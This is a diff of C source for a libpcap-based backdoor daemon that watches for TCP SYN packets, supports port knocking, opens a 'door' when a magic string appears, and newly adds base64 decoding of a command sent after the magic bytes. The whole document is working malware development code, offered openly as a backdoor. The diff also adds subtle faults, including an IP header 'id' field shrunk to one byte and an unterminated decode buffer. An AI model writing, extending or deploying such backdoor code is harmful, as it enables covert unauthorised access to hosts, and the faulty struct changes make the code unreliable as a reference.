@@ -17,44 +17,48 @@
 #include <signal.h>
 #include <unistd.h>
 #include <syslog.h>
+#include <openssl/bio.h>
+#include <openssl/evp.h>
+#include <openssl/buffer.h>
 
 struct iphdr {
-    u_char          ihl:4;         /* header length */
-    u_char          version:4;    /* version */
-    u_char          tos;          /* type of service */
-    short           tot_len;      /* total length */
-    u_short         id;           /* identification */
-    short           off;          /* fragment offset field */
-    u_char          ttl;          /* time to live */
-    u_char          protocol;     /* protocol */
-    u_short         check;        /* checksum */
-    struct in_addr  saddr;
-	struct in_addr  daddr;        /* source and dest address */
+    unsigned char       ihl:4;        /* header length */
+    unsigned char       version:4;    /* version */
+    unsigned char       tos;          /* type of service */
+    short               tot_len;      /* total length */
+    unsigned char       id;           /* identification */
+    short               off;          /* fragment offset field */
+    unsigned char       ttl;          /* time to live */
+    unsigned char       protocol;     /* protocol */
+    unsigned short      check;        /* checksum */
+    struct in_addr      saddr;
+	struct in_addr      daddr;        /* source and dest address */
 };
 
 struct tcphdr {
-    unsigned short int 	    src_port;
-	unsigned short int 	    dest_port;
-    unsigned int 	        seq_num;
-    unsigned int 	        ack_num;
-	unsigned short int	    rawflags;
-    unsigned short int 	    window;
-    unsigned short int      checksum;
-    unsigned short int      urgent_pointer;
+    unsigned short      src_port;
+	unsigned short	    dest_port;
+    unsigned int 	    seq_num;
+    unsigned int 	    ack_num;
+	unsigned short      rawflags;
+    unsigned short 	    window;
+    unsigned short      checksum;
+    unsigned short      urgent_pointer;
 };
 
 
 void create_deamon_process(char *cdr_noise_command) {
-    char pcap_err[PCAP_ERRBUF_SIZE]; /* buffer for pcap errors */
-    pcap_t *cap; /* captuer handler */
-    bpf_u_int32 network, netmask;
-    struct pcap_pkthdr *phead;
-    struct bpf_program cfilter; /* the compiled filter */
-    struct iphdr *ip;
-    struct tcphdr *tcp;
-    u_char *pdata;
-    char *filter;
-    int cdr_noise = 0;
+    char                    pcap_err[PCAP_ERRBUF_SIZE]; /* buffer for pcap errors */
+    pcap_t                  *cap;                       /* captuer handler */
+    bpf_u_int32             network;
+    bpf_u_int32             netmask;
+    struct pcap_pkthdr      *phead;
+    struct bpf_program      cfilter;                    /* the compiled filter */
+    struct iphdr            *ip;
+    struct tcphdr           *tcp;
+    u_char                  *pdata;
+    char                    *filter;
+    int                     cdr_noise = 0;
 
     /* Determines if it will report errors to stderr */
     if(cdr_noise_command) {
@@ -64,15 +68,16 @@ void create_deamon_process(char *cdr_noise_command) {
             exit(0);
         }
     }
-
-    unsigned int 	cports[] = CDR_PORTS;
-    int		cportcnt = 0;
-    int		actport = 0;
+    
+#ifdef PORT_KNOCK_LIST
+    unsigned int 	    cports[] = CDR_PORTS;
+    int		            cportcnt = 0;
+    int		            actport = 0;
 
     while (cports[cportcnt++]);
     cportcnt--; 
 
-#ifdef PORT_KNOCK_LIST
+
     filter = set_port_knock_list_filter(cports, cportcnt);
 #endif
 
@@ -142,12 +147,6 @@ void create_deamon_process(char *cdr_noise_command) {
     }
 
     for(;;) {
-        /**
-         * This section up until the #ifdef is checking to see if the packet that
-         * we captured is a SYN packet and it is IPv4. If it is not a SYN packet 
-         * we continue and dont bother with it.
-        */
-
         /* if there is no 'next' packet in time, continue loop */
         if ((pdata=(u_char *)pcap_next(cap,phead))==NULL) continue;
         /* if the packet is to small, continue loop */
@@ -264,6 +263,8 @@ void open_backdoor_via_magic_bytes(struct tcphdr *tcp, struct iphdr *ip) {
     if(memcmp(data, MAGIC_STRING, MAGIC_STRING_LEN) == 0) {
         cdr_open_door();
     }
+
+    capture_command_after_magic_bytes(data);
 }
 
 char* set_port_knock_list_filter(unsigned int cports[], int cportcnt) {
@@ -320,4 +321,35 @@ char *set_magic_string_filter() {
     LOG("Filter: '%s'\n",filter);
 
     return filter;
+}
+
+void capture_command_after_magic_bytes(unsigned char *data) {
+    unsigned char *encoded_command = data + MAGIC_STRING_LEN;
+
+    int decoded_len;
+    unsigned char *decoded_command = base64_decode(encoded_command, &decoded_len);
+
+    LOG("Command: %s", decoded_command);
+    free(decoded_command);
+}
+
+unsigned char *base64_decode(unsigned char *input, int *out_len) {
+    BIO *bio, *b64;
+    int input_len = strlen((char*)input);
+    
+    unsigned char *buffer = (unsigned char *)malloc(input_len);
+    if (!buffer) {
+        printf("Memory allocation failed!\n");
+        exit(1);
+    }
+
+    b64 = BIO_new(BIO_f_base64());
+    bio = BIO_new_mem_buf(input, -1);
+    bio = BIO_push(b64, bio);
+    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
+
+    *out_len = BIO_read(bio, buffer, input_len);
+    BIO_free_all(bio);
+
+    return buffer;
 }
